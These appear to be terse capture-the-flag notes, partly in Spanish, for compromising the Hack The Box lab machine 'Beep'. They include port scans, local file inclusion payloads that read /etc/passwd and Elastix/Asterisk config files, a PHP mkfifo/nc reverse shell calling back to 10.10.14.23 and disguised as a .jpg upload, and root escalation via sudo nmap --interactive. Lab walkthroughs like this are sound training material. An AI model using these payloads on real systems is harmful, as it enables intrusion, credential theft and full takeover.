# BEEP

IP: 10.10.10.7

# Ping y ttl

`ping -c 1 10.10.10.7`

`whichSystem.py 10.10.10.7`

## Scanning

`nmap -p- --open -T5 -v -n 10.10.10.7 -oN allPorts`

`nmap -sC -sV -p22,111,3306,995,80,143,993,443,110,25,4445 10.10.10.7 -oN targetedPorts`

Navegamos a la web con el puerto 80

- wapallyzer
- `whatweb http://10.10.10.7`
- buscar que es elastix 
- default credentials elastix
- `searchsploit elastix`
- `searchsploit -x /path` --> FLI
- ../../../etc/amportal.conf%00&module=Accounts&action

`ssh root@10.10.10.7` --> pass 

~~~
ls
whoami
cat root.txt
cd ..
find \-name user.txt 2>/dev/null
~~~

## 2º opcion

- ../../../etc/passwd%00&module=Accounts&action

`cat targetedPorts | grep "http"`

`cat targetedPorts | grep "http" | grep -oP '\d{1,5}/tcp'`  

- Vamos a 10.10.10.7:10000
- ../../../etc/asterisk/asterisk.conf%00&module=Accounts&action
- ../../../etc/asterisk/manager.conf%00&module=Accounts&action

- Entramos en 10.10.10.7/vtigercm/index.php
- Visitamos http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
- nano shell.php
~~~
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 443 >/tmp/f");
?>
~~~

`nc -nlvp 443`

`mv shell.php shell.php.jpg`

Subimos el archivo en la seccion company cambiando el logo.

`whoami`

`script /dev/null -c bash`

`cd /home/fanis`

## Escalada de privilegios

~~~
sudo -l
sudo nmap --interactive
!sh
whoami
cd /root
cat root.txt
~~~

`sudo chown asterisk:asterisk -R root/`
`whoami`

